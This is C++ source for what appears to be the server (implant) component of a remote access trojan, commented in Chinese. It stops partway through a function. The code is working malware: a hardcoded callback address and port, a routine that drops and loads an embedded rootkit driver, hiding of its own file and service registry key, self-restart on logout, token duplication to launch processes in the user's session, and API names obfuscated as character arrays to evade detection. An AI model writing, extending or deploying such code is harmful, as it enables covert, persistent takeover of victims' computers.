// Server.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <stdio.h>
#include <Shlobj.h>
#include <DbgHelp.h>
#include "DriverCode32.h"
#include "DriverCode64.h"
#include "Myfunction.h"
#include "ClientSocket.h"
#include "common/KernelManager.h"
#include "common/KeyboardManager.h"
#include "common/login.h"
#include "driver/QAssist.h"

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "../common/zlib/zlib.lib")

#ifdef _DEBUG
	#pragma comment(lib, "driver/x32/Debug/QAssist.lib")
#else
	#pragma comment(lib, "driver/x32/Release/QAssist.lib")
#endif

Myfunction *pMyfunction;

#define HEART_BEAT_TIME 1000 * 60  //心跳时间
char *lpDriverName = "QAssist";    //驱动名称

extern std::map<DWORD, HANDLE> vShellCmdHandleList;

HANDLE g_hMutexEntry = NULL;
HANDLE g_hMutexLogin = NULL;
HANDLE g_hEventRvive = NULL;
HidContext g_hidContext = NULL;
HidObjId g_objIdSelfFile = 0;

SERVICE_STATUS_HANDLE hServiceStatus = NULL;
SERVICE_STATUS ServiceStatus;
BOOL bisUnInstall = FALSE;
MODIFY_DATA modify_data = 
{
	"192.168.1.101",
		"",
		8080,
		8080,
		"",
		"",
		"",
		"",
		"",
		"",
		FALSE,			//FALSE为未使用内网穿透
		TRUE,			//TRUE为服务启动
		TRUE,			//TRUE为启动目录启动
		TRUE,			//TRUE为绿色安装，FALSE为标准安装
		"",
		"",
		0,
		FILE_ATTRIBUTE_NORMAL,
		0,
		""
};

enum
{
	NOT_CONNECT, //还没有连接
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};
FARPROC MyGetProcAddressA(LPCSTR lpFileName, LPCSTR lpProcName)
{
	HMODULE hModule;
	hModule = GetModuleHandleA(lpFileName);
	if (hModule == NULL)
		hModule = LoadLibraryA(lpFileName);
	if (hModule != NULL)
		return GetProcAddress(hModule,lpProcName);
	else
		return NULL;
}

BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &hToken))
		return FALSE;

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	LookupPrivilegeValue(NULL, lpPrivilegeName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		CloseHandle(hToken);
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}

LRESULT CALLBACK LogoutOrShutdownRevive(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	if (message == WM_QUERYENDSESSION)
	{
		if (modify_data.bRuns && g_hidContext && g_objIdSelfFile)
		{
			Hid_RemoveHiddenFile(g_hidContext, g_objIdSelfFile);
			return TRUE;
		}
		CloseHandle(g_hMutexEntry);
		CloseHandle(g_hMutexLogin);
		
		SC_HANDLE schManager = NULL, schService = NULL;
		schManager = OpenSCManager(NULL, NULL, STANDARD_RIGHTS_EXECUTE);
		if (schManager == NULL)
			return TRUE;
		schService = OpenService(schManager, modify_data.SerName, SERVICE_START);
		if (schService == NULL)
		{
			CloseServiceHandle(schManager);
			return TRUE;
		}
		LPCSTR szArgs = "-wait";
		if (!StartService(schService, 1, &szArgs))
		{
			CloseServiceHandle(schService);
			CloseServiceHandle(schManager);
			return TRUE;
		}
		CloseServiceHandle(schService);
		CloseServiceHandle(schManager);
		//exit(0);
		ExitProcess(0);
		return TRUE;
	}
	return DefWindowProc(hWnd, message, wParam, lParam);
}

DWORD WINAPI LogoutOrShutdownRevive(LPVOID lpParam)
{
	// 如果是绿色模式, 则直接退出线程
	if (modify_data.bRunOnce)
		return 0;
	
	MSG msg;
	char szClassName[] = {'R','e','v','i','v','e','W','n','d','\0'};
	WNDCLASSEX wcex;
	
	wcex.cbSize			= sizeof(WNDCLASSEX); 
	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= (WNDPROC)LogoutOrShutdownRevive;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= NULL;
	wcex.hIcon			= NULL;
	wcex.hCursor		= NULL;
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= NULL;
	wcex.lpszClassName	= szClassName;
	wcex.hIconSm		= NULL;
	
	RegisterClassEx(&wcex);
	if (!CreateWindowEx(0x08000000L,szClassName,NULL,WS_POPUP,0,0,0,0,NULL,NULL,NULL,NULL))
		return -1;
	while (GetMessage(&msg,NULL,0,0)) 
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

BOOL InstallDriver(LPCSTR lpDriverName)
{
	NTSTATUS ntStatus;
	char szDriverPath[MAX_PATH];
	BOOL bIsWow64 = FALSE;
	HANDLE hFile;
	DWORD dwBytesWritten;
	HKEY hKey;
	
	GetWindowsDirectory(szDriverPath, MAX_PATH);
	IsWow64Process(GetCurrentProcess(), &bIsWow64);
	if (bIsWow64)
	{
		strcat(szDriverPath, "\\sysnative\\drivers\\");
		strcat(szDriverPath, lpDriverName);
		strcat(szDriverPath, ".sys");
	} else {
		strcat(szDriverPath, "\\system32\\drivers\\");
		strcat(szDriverPath, lpDriverName);
		strcat(szDriverPath, ".sys");
	}
	hFile = CreateFile(szDriverPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		if (!WriteFile(hFile, bIsWow64 ? g_DriverCode64FileBuff : g_DriverCode32FileBuff,
			bIsWow64 ? g_DriverCode64FileSize : g_DriverCode32FileSize, &dwBytesWritten, NULL))
		{
			CloseHandle(hFile);
			return FALSE;
		}
		CloseHandle(hFile);
	}
	
	strcpy(szDriverPath, "SYSTEM\\CurrentControlSet\\Services\\");
	strcat(szDriverPath, lpDriverName);
	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, szDriverPath, 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
	{
		return FALSE;
	}
	dwBytesWritten = SERVICE_FILE_SYSTEM_DRIVER;
	if(RegSetValueEx(hKey, "Type", 0, REG_DWORD, (BYTE *)&dwBytesWritten, sizeof(dwBytesWritten)) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return FALSE;
	}
	dwBytesWritten = SERVICE_SYSTEM_START;
	if(RegSetValueEx(hKey, "Start", 0, REG_DWORD, (BYTE *)&dwBytesWritten, sizeof(dwBytesWritten)) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return FALSE;
	}
	dwBytesWritten = SERVICE_ERROR_IGNORE;
	if(RegSetValueEx(hKey, "ErrorControl", 0, REG_DWORD, (BYTE *)&dwBytesWritten, sizeof(dwBytesWritten)) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return FALSE;
	}
	strcpy(szDriverPath, "system32\\DRIVERS\\");
	strcat(szDriverPath, lpDriverName);
	strcat(szDriverPath, ".sys");
	if(RegSetValueEx(hKey, "ImagePath", 0, REG_EXPAND_SZ, (BYTE *)szDriverPath, strlen(szDriverPath)) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return FALSE;
	}
	if(RegSetValueEx(hKey, "DisplayName", 0, REG_SZ, (BYTE *)lpDriverName, strlen(lpDriverName)) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return FALSE;
	}
	strcpy(szDriverPath, "FSFilter Activity Monitor");
	if(RegSetValueEx(hKey, "Group", 0, REG_SZ, (BYTE *)szDriverPath, strlen(szDriverPath)) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return FALSE;
	}
	strcpy(szDriverPath, "FltMgr");
	memset(szDriverPath + strlen(szDriverPath), 0, 2);
	if(RegSetValueEx(hKey, "DependOnService", 0, REG_MULTI_SZ, (BYTE *)szDriverPath, strlen(szDriverPath)) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return FALSE;
	}
	dwBytesWritten = 0x0;
	if(RegSetValueEx(hKey, "DebugFlags", 0, REG_DWORD, (BYTE *)&dwBytesWritten, sizeof(dwBytesWritten)) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return FALSE;
	}
	dwBytesWritten = 0x3;
	if(RegSetValueEx(hKey, "SupportedFeatures", 0, REG_DWORD, (BYTE *)&dwBytesWritten, sizeof(dwBytesWritten)) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return FALSE;
	}
	strcpy(szDriverPath, "\\??\\");
	GetSystemDirectory(szDriverPath + 4, MAX_PATH);
	strcat(szDriverPath, "\\Services.exe");
	strcat(szDriverPath, ";none");
	memset(szDriverPath + strlen(szDriverPath), 0, 2);
	if (RegSetValueEx(hKey, "Hid_IgnoredImages", 0, REG_MULTI_SZ, (BYTE *)szDriverPath, strlen(szDriverPath)) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return FALSE;
	}
	RegFlushKey(hKey);
	RegCloseKey(hKey);
	
	strcpy(szDriverPath, "SYSTEM\\CurrentControlSet\\Services\\");
	strcat(szDriverPath, lpDriverName);
	strcat(szDriverPath, "\\Instances");
	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, szDriverPath, 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
	{
		return FALSE;
	}
	strcpy(szDriverPath, lpDriverName);
	strcat(szDriverPath, " Instance");
	if(RegSetValueEx(hKey, "DefaultInstance", 0, REG_SZ, (BYTE *)szDriverPath, strlen(szDriverPath)) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return FALSE;
	}
	RegFlushKey(hKey);
	RegCloseKey(hKey);
	
	strcpy(szDriverPath, "SYSTEM\\CurrentControlSet\\Services\\");
	strcat(szDriverPath, lpDriverName);
	strcat(szDriverPath, "\\Instances\\");
	strcat(szDriverPath, lpDriverName);
	strcat(szDriverPath, " Instance");
	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, szDriverPath, 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
	{
		return FALSE;
	}
	strcpy(szDriverPath, "370030");
	if (RegSetValueEx(hKey, "Altitude", 0, REG_SZ, (BYTE *)szDriverPath, strlen(szDriverPath)) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return FALSE;
	}
	memset(szDriverPath, 0, sizeof(DWORD));
	if (RegSetValueEx(hKey, "Flags", 0, REG_DWORD, (BYTE *)szDriverPath, sizeof(DWORD)) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return FALSE;
	}
	RegFlushKey(hKey);
	RegCloseKey(hKey);
	
	EnablePrivilege(SE_LOAD_DRIVER_NAME, TRUE);
	RtlInitUnicodeStringT RtlInitUnicodeString = (RtlInitUnicodeStringT)MyGetProcAddressA("NTDLL.DLL", "RtlInitUnicodeString");
	ZwLoadDriverT ZwLoadDriver = (ZwLoadDriverT)MyGetProcAddressA("NTDLL.DLL", "ZwLoadDriver");
	WCHAR szDriverServiceName[256];
	UNICODE_STRING usDriverServiceName;
	swprintf(szDriverServiceName, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%S", lpDriverName);
	RtlInitUnicodeString(&usDriverServiceName, szDriverServiceName);
	ntStatus = ZwLoadDriver(&usDriverServiceName);
	EnablePrivilege(SE_LOAD_DRIVER_NAME, FALSE);
	return (ntStatus >= 0);
}

DWORD WINAPI SelfProtectAndHide(LPVOID lpParam)
{
	HidStatus hid_status;
	WCHAR szSelfImagePath[MAX_PATH];
	WCHAR szSelfServiceKey[MAX_PATH];
	WCHAR szLsaProcPath[MAX_PATH];
	WCHAR szLsmProcPath[MAX_PATH];
	WCHAR szAudiodgPath[MAX_PATH];
	HidObjId objId;
	
	if (!modify_data.bRunOnce)
	{
		hid_status = Hid_Initialize(&g_hidContext);
		if (!HID_STATUS_SUCCESSFUL(hid_status))
		{
			InstallDriver(lpDriverName);
			hid_status = Hid_Initialize(&g_hidContext);
			if (!HID_STATUS_SUCCESSFUL(hid_status))
				return -1;
		}
		GetModuleFileNameW(NULL, szSelfImagePath, MAX_PATH);
		Hid_AddProtectedImage(g_hidContext, szSelfImagePath, WithoutInherit, true, &objId);
		Hid_AddHiddenFile(g_hidContext, szSelfImagePath, &g_objIdSelfFile);
		if (modify_data.bService)
		{
			swprintf(szSelfServiceKey, L"SYSTEM\\CurrentControlSet\\Services\\%S", modify_data.SerName);
			Hid_AddHiddenRegKey(g_hidContext, RegHKLM, szSelfServiceKey, &objId);
		}
		Hid_AddExcludedImage(g_hidContext, szSelfImagePath, WithoutInherit, true, &objId);
		GetSystemDirectoryW(szLsaProcPath, MAX_PATH);
		wcscat(szLsaProcPath, L"\\lsass.exe");
		Hid_AddExcludedImage(g_hidContext, szLsaProcPath, WithoutInherit, true, &objId);
		GetSystemDirectoryW(szLsmProcPath, MAX_PATH);
		wcscat(szLsmProcPath, L"\\lsm.exe");
		Hid_AddExcludedImage(g_hidContext, szLsmProcPath, WithoutInherit, true, &objId);
		GetSystemDirectoryW(szAudiodgPath, MAX_PATH);
		wcscat(szAudiodgPath, L"\\audiodg.exe");
		Hid_AddExcludedImage(g_hidContext, szAudiodgPath, WithoutInherit, true, &objId);
	}
	return 0;
}

LPSTR GetActiveConsoleUserSid()
{
	char iOagR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char wSuTs[]={'W','T','S','G','e','t','A','c','t','i','v','e','C','o','n','s','o','l','e','S','e','s','s','i','o','n','I','d','\0'};
	typedef DWORD (WINAPI *WTSGetActiveConsoleSessionIdT)(void);
	WTSGetActiveConsoleSessionIdT pWTSGetActiveConsoleSessionId=(WTSGetActiveConsoleSessionIdT)MyGetProcAddressA(iOagR,wSuTs);
	
	char oIksN[]={'W','T','S','A','P','I','3','2','.','d','l','l','\0'};
	char xAsDm[]={'W','T','S','Q','u','e','r','y','U','s','e','r','T','o','k','e','n','\0'};
	typedef BOOL (WINAPI *WTSQueryUserTokenT)(ULONG SessionId,PHANDLE phToken);
	WTSQueryUserTokenT pWTSQueryUserToken=(WTSQueryUserTokenT)MyGetProcAddressA(oIksN,xAsDm);
	
	char AjrFx[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	char FKYmC[]={'G','e','t','T','o','k','e','n','I','n','f','o','r','m','a','t','i','o','n','\0'};
	typedef BOOL (WINAPI *GetTokenInformationT)(HANDLE TokenHandle,TOKEN_INFORMATION_CLASS TokenInformationClass,LPVOID TokenInformation,DWORD TokenInformationLength,PDWORD ReturnLength);
	GetTokenInformationT pGetTokenInformation=(GetTokenInformationT)MyGetProcAddressA(AjrFx,FKYmC);
	
	char xISKv[]={'C','o','n','v','e','r','t','S','i','d','T','o','S','t','r','i','n','g','S','i','d','A','\0'};
	typedef BOOL (WINAPI *ConvertSidToStringSidAT)(PSID Sid,LPSTR *StringSid);
	ConvertSidToStringSidAT pConvertSidToStringSidA=(ConvertSidToStringSidAT)MyGetProcAddressA(AjrFx,xISKv);
	
	DWORD		dwSessionId = 0;
	HANDLE		hTokenAcsi = NULL;
	DWORD		dwReturnLength;
	PTOKEN_USER	pTokenUser  = NULL;
	LPSTR		lpszUserSid = NULL;
	
	while ((dwSessionId = pWTSGetActiveConsoleSessionId()) == 0xFFFFFFFF)
		Sleep(100);
	if (!pWTSQueryUserToken(dwSessionId, &hTokenAcsi))
		return lpszUserSid;
	pGetTokenInformation(hTokenAcsi, TokenUser, NULL, 0, &dwReturnLength);
	pTokenUser = (PTOKEN_USER)malloc(dwReturnLength);
	pGetTokenInformation(hTokenAcsi, TokenUser, pTokenUser, dwReturnLength, &dwReturnLength);
	if (pTokenUser)
		pConvertSidToStringSidA(pTokenUser->User.Sid, &lpszUserSid);
	free(pTokenUser);
	CloseHandle(hTokenAcsi);
	return lpszUserSid;
}

DWORD WINAPI GetActiveConsoleUserSid(LPVOID lpParam)
{
	char szUserName[50] = {0};
	extern BOOL GetCurrentUserName(char *szUserName);
	SelfProtectAndHide(NULL);
	// 如果是绿色模式或非服务模式, 则直接退出线程
	if (modify_data.bRunOnce || !modify_data.bService)
		return 0;
	while (!GetCurrentUserName(szUserName))
		Sleep(DWORD(lpParam));
	lpszUserSid = GetActiveConsoleUserSid();
	return 0;
}

DWORD WINAPI SwapsPhysicalMemoryOut(LPVOID lpParam)
{
	char lPmjX[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char rSmiX[]={'S','e','t','P','r','o','c','e','s','s','W','o','r','k','i','n','g','S','e','t','S','i','z','e','\0'};
	typedef BOOL (WINAPI *SetProcessWorkingSetSizeT)(HANDLE hProcess,SIZE_T dwMinimumWorkingSetSize,SIZE_T dwMaximumWorkingSetSize);
	SetProcessWorkingSetSizeT pSetProcessWorkingSetSize=(SetProcessWorkingSetSizeT)MyGetProcAddressA(lPmjX,rSmiX);
	
	while (1)
	{
		Sleep((DWORD)lpParam);
		pSetProcessWorkingSetSize(GetCurrentProcess(), -1, -1);
	}
	return 0;
}

HANDLE RunInActiveSession(BOOL bSession0, LPCSTR lpCommandLine)
{
	char AjrFx[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	char kbCfr[]={'O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n','\0'};
	OpenProcessTokenT pOpenProcessToken=(OpenProcessTokenT)MyGetProcAddressA(AjrFx,kbCfr);
	
	char LaDJt[]={'D','u','p','l','i','c','a','t','e','T','o','k','e','n','E','x','\0'};
	DuplicateTokenExT pDuplicateTokenEx=(DuplicateTokenExT)MyGetProcAddressA(AjrFx,LaDJt);
	
	char iOagR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char wSuTs[]={'W','T','S','G','e','t','A','c','t','i','v','e','C','o','n','s','o','l','e','S','e','s','s','i','o','n','I','d','\0'};
	typedef DWORD (WINAPI *WTSGetActiveConsoleSessionIdT)(void);
	WTSGetActiveConsoleSessionIdT pWTSGetActiveConsoleSessionId=(WTSGetActiveConsoleSessionIdT)MyGetProcAddressA(iOagR,wSuTs);
	
	char FKYmC[]={'S','e','t','T','o','k','e','n','I','n','f','o','r','m','a','t','i','o','n','\0'};
	SetTokenInformationT pSetTokenInformation=(SetTokenInformationT)MyGetProcAddressA(AjrFx,FKYmC);
	
	char jCyke[]={'U','S','E','R','E','N','V','.','d','l','l','\0'};
	HMODULE hModuleUserenv = LoadLibrary(jCyke);
	
	char KoX3m[]={'C','r','e','a','t','e','E','n','v','i','r','o','n','m','e','n','t','B','l','o','c','k','\0'};
	typedef BOOL (WINAPI *CEB)(LPVOID *lpEnvironment,HANDLE hToken,BOOL bInherit);
	CEB pCreateEnvironmentBlock= (CEB)GetProcAddress(hModuleUserenv,KoX3m);
	
	char oIksN[]={'W','T','S','A','P','I','3','2','.','d','l','l','\0'};
	char xAsDm[]={'W','T','S','Q','u','e','r','y','U','s','e','r','T','o','k','e','n','\0'};
	typedef BOOL (WINAPI *WTSQueryUserTokenT)(ULONG SessionId,PHANDLE phToken);
	WTSQueryUserTokenT pWTSQueryUserToken=(WTSQueryUserTokenT)MyGetProcAddressA(oIksN,xAsDm);
	
	char bFJOa[]={'C','r','e','a','t','e','P','r','o','c','e','s','s','A','s','U','s','e','r','A','\0'};
	CreateProcessAsUserAT pCreateProcessAsUserA=(CreateProcessAsUserAT)MyGetProcAddressA(AjrFx,bFJOa);
	
	char Km5tu[]={'D','e','s','t','r','o','y','E','n','v','i','r','o','n','m','e','n','t','B','l','o','c','k','\0'};
	typedef BOOL (WINAPI *DEB)(LPVOID lpEnvironment);
	DEB pDestroyEnvironmentBlock= (DEB)GetProcAddress(hModuleUserenv,Km5tu);
	
	HANDLE hProcess = NULL;
	LPVOID lpEnvironment = NULL;
	DWORD  dwSessionId = 0;
	HANDLE hTokenThis = NULL;
	HANDLE hTokenCopy = NULL;
	HANDLE hTokenAcsi = NULL;
	
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	ZeroMemory(&StartupInfo,sizeof(STARTUPINFO));
	ZeroMemory(&ProcessInfo,sizeof(PROCESS_INFORMATION));
	
	ProcessInfo.hProcess = 0;
	ProcessInfo.hThread = 0;
	ProcessInfo.dwProcessId = 0;
	ProcessInfo.dwThreadId = 0;
	StartupInfo.cb = 68;
	StartupInfo.lpDesktop = "WinSta0\\Default";
	
	pOpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hTokenThis);
	pDuplicateTokenEx(hTokenThis,MAXIMUM_ALLOWED,NULL,SecurityIdentification,TokenPrimary,&hTokenCopy);
	
	if (pWTSGetActiveConsoleSessionId)
	{
		if (!bSession0)
		{
			while ((dwSessionId = pWTSGetActiveConsoleSessionId()) == 0xFFFFFFFF)
				Sleep(20);
		}
		pSetTokenInformation(hTokenCopy,TokenSessionId,&dwSessionId,sizeof(DWORD));
		pWTSQueryUserToken(dwSessionId,&hTokenAcsi);
		pCreateEnvironmentBlock(&lpEnvironment,hTokenAcsi,FALSE);
		while (!pCreateProcessAsUserA(hTokenCopy,NULL,(char *)lpCommandLine,NULL,NULL,false,CREATE_UNICODE_ENVIRONMENT,lpEnvironment,NULL,&StartupInfo,&ProcessInfo))
			Sleep(1000);
		pDestroyEnvironmentBlock(lpEnvironment);
		hProcess = ProcessInfo.hProcess;
		CloseHandle(ProcessInfo.hThread);
	}
	
	if (hTokenAcsi)
		CloseHandle(hTokenAcsi);
	if (hTokenCopy)
		CloseHandle(hTokenCopy);
	if (hTokenThis)
		CloseHandle(hTokenThis);
	if(hModuleUserenv)
		FreeLibrary(hModuleUserenv);
	
	return hProcess;
}

DWORD WINAPI AutoAdjustSessionId(LPVOID lpParam)
{
	char lPmjX[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char rSmiX[]={'P','r','o','c','e','s','s','I','d','T','o','S','e','s','s','i','o','n','I','d','\0'};
	typedef BOOL (WINAPI *ProcessIdToSessionIdT)(DWORD dwProcessId,DWORD* pSessionId);
	ProcessIdToSessionIdT pProcessIdToSessionId=(ProcessIdToSessionIdT)MyGetProcAddressA(lPmjX,rSmiX);
	
	char wSuTs[]={'W','T','S','G','e','t','A','c','t','i','v','e','C','o','n','s','o','l','e','S','e','s','s','i','o','n','I','d','\0'};
	typedef DWORD (WINAPI *WTSGetActiveConsoleSessionIdT)(void);
	WTSGetActiveConsoleSessionIdT pWTSGetActiveConsoleSessionId=(WTSGetActiveConsoleSessionIdT)MyGetProcAddressA(lPmjX,wSuTs);
	
	char AjrFx[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	char xTfkA[]={'S','e','t','S','e','r','v','i','c','e','S','t','a','t','u','s','\0'};
	typedef BOOL (WINAPI *SetServiceStatusT)(SERVICE_STATUS_HANDLE hServiceStatus,LPSERVICE_STATUS lpServiceStatus);
	SetServiceStatusT pSetServiceStatus=(SetServiceStatusT)MyGetProcAddressA(AjrFx,xTfkA);
	
	// 如果是绿色模式或非服务模式, 则直接退出线程
	if (modify_data.bRunOnce || !modify_data.bService)
		return 0;
	
	OSVERSIONINFOEX OsVerInfoEx;
	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // 注意转换类型
	GetNtVersionNumbers(OsVerInfoEx.dwMajorVersion,OsVerInfoEx.dwMinorVersion,OsVerInfoEx.dwBuildNumber);
	
	char CommandLine[1024], ServicePath[MAX_PATH];
	HANDLE hActiveSession = NULL;
	GetModuleFileName(NULL, ServicePath, MAX_PATH);
	sprintf(CommandLine, "%s -acsi", ServicePath);
	
	DWORD dwCurrentSessionId = 0, dwActiveSessionId = 0;
	while (TRUE)
	{
		Sleep((DWORD)lpParam); // 定时检测活动会话, 并且自动进行调整
		if (pProcessIdToSessionId(GetCurrentProcessId(), &dwCurrentSessionId))
		{
			//检测活动会话
			dwActiveSessionId = pWTSGetActiveConsoleSessionId();
			if (dwActiveSessionId == 0xFFFFFFFF)
				continue;
			if (dwCurrentSessionId == dwActiveSessionId)
				continue;
			//用户登录状态
			DWORD dwArgs = 0; LPCSTR szArgs = "-rsvc";
			LPSTR lpUserName = NULL; DWORD dwUserSize = 0;
			if (WTSQuerySessionInformation(NULL, dwActiveSessionId, WTSUserName, &lpUserName, &dwUserSize))
			{
				if (!strlen(lpUserName))
					dwArgs = 1;
				WTSFreeMemory(lpUserName);
			}
			else dwArgs = 1;
			//处于登录界面
			if (hServiceStatus != NULL && dwArgs)
				continue;
			//终止终端程序
			std::map<DWORD, HANDLE>::iterator it;
			DWORD dwProcessList, *lpdwProcessList, dwProcessCount;
			for (it = vShellCmdHandleList.begin(); it != vShellCmdHandleList.end(); it++)
			{
				while (!AttachConsole(it->first))
					Sleep(10);
				dwProcessCount = GetConsoleProcessList(&dwProcessList, 1);
				if (dwProcessCount > 1)
				{
					lpdwProcessList = new DWORD[dwProcessCount];
					GetConsoleProcessList(lpdwProcessList, dwProcessCount);
					for (int i = 0; i < dwProcessCount; i++)
					{
						if (lpdwProcessList[i] == GetCurrentProcessId())
							continue;
						if (lpdwProcessList[i] == it->first)
							continue;
						HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, lpdwProcessList[i]);
						if (hProcess == NULL)
							continue;
						TerminateProcess(hProcess, 0);
						CloseHandle(hProcess);
					}
					delete[] lpdwProcessList;
				}
				while (!FreeConsole())
					Sleep(10);
				TerminateProcess(it->second, 0);
			}
			CloseHandle(g_hMutexEntry);
			CloseHandle(g_hMutexLogin);
			//重新启动服务
			if (hServiceStatus != NULL)
			{
				hActiveSession = RunInActiveSession(FALSE,CommandLine);
				CloseHandle(hActiveSession);
				ServiceStatus.dwCurrentState = SERVICE_STOPPED;
				pSetServiceStatus(hServiceStatus,&ServiceStatus);
			}
			else if ((OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion >= 2) || OsVerInfoEx.dwMajorVersion > 6)
			{
				hActiveSession = RunInActiveSession(FALSE,CommandLine);
				CloseHandle(hActiveSession); // Win7以后系统, 活动会话改变后, 以新活动会话运行
			}
			else // Vista和Win7系统, 活动会话改变后, 位于登录界面时(活动会话未登录帐号), 以服务模式运行
			{
				SC_HANDLE schManager = NULL, schService = NULL;
				schManager = OpenSCManager(NULL, NULL, STANDARD_RIGHTS_EXECUTE);
				if (schManager == NULL)
					continue;
				schService = OpenService(schManager, modify_data.SerName, SERVICE_START);
				if (schService == NULL)
				{
					CloseServiceHandle(schManager);
					continue;
				}
				if (!StartService(schService, dwArgs, &szArgs))
				{
					CloseServiceHandle(schService);
					CloseServiceHandle(schManager);
					continue;
				}
				CloseServiceHandle(schService);
				CloseServiceHandle(schManager);
			}
			//exit(0);
			ExitProcess(0);
		}
	}
	return 0;
}

bool OpenFile1(LPCTSTR lpFile, BOOL bRunInAcsiUser, INT nShowCmd)
{
	char iOagR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char r6oRe[]={'G','e','t','F','i','l','e','A','t','t','r','i','b','u','t','e','s','A','\0'};
	GetFileAttributesAT pGetFileAttributesA = (GetFileAttributesAT)MyGetProcAddressA(iOagR,r6oRe);
	
	char xWiSd[]={'S','H','E','L','L','3','2','.','d','l','l','\0'};
	char zIksG[]={'S','h','e','l','l','E','x','e','c','u','t','e','A','\0'};
	ShellExecuteAT pShellExecuteA=(ShellExecuteAT)MyGetProcAddressA(xWiSd,zIksG);
	
	char AjrFx[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	char KoX3m[]={'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
	RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)MyGetProcAddressA(AjrFx,KoX3m);
	
	char jIomR[]={'R','e','g','Q','u','e','r','y','V','a','l','u','e','A','\0'};
	RegQueryValueAT pRegQueryValueA=(RegQueryValueAT)MyGetProcAddressA(AjrFx,jIomR);
	
	char fZkmT[]={'R','e','g','C','l','o','s','e','K','e','y','\0'};
	RegCloseKeyT pRegCloseKey=(RegCloseKeyT)MyGetProcAddressA(AjrFx,fZkmT);
	
	char wSuTs[]={'W','T','S','G','e','t','A','c','t','i','v','e','C','o','n','s','o','l','e','S','e','s','s','i','o','n','I','d','\0'};
	typedef DWORD (WINAPI *WTSGetActiveConsoleSessionIdT)(void);
	WTSGetActiveConsoleSessionIdT pWTSGetActiveConsoleSessionId=(WTSGetActiveConsoleSessionIdT)MyGetProcAddressA(iOagR,wSuTs);
	
	char oIksN[]={'W','T','S','A','P','I','3','2','.','d','l','l','\0'};
	char xAsDm[]={'W','T','S','Q','u','e','r','y','U','s','e','r','T','o','k','e','n','\0'};
	typedef BOOL (WINAPI *WTSQueryUserTokenT)(ULONG SessionId,PHANDLE phToken);
	WTSQueryUserTokenT pWTSQueryUserToken=(WTSQueryUserTokenT)MyGetProcAddressA(oIksN,xAsDm);
	
	char kTLdR[]={'C','r','e','a','t','e','P','r','o','c','e','s','s','A','\0'};
	CreateProcessAT pCreateProcessA=(CreateProcessAT)MyGetProcAddressA(iOagR,kTLdR);
	
	char rAtzT[]={'C','r','e','a','t','e','P','r','o','c','e','s','s','A','s','U','s','e','r','A','\0'};
	CreateProcessAsUserAT pCreateProcessAsUserA=(CreateProcessAsUserAT)MyGetProcAddressA(AjrFx,rAtzT);
	
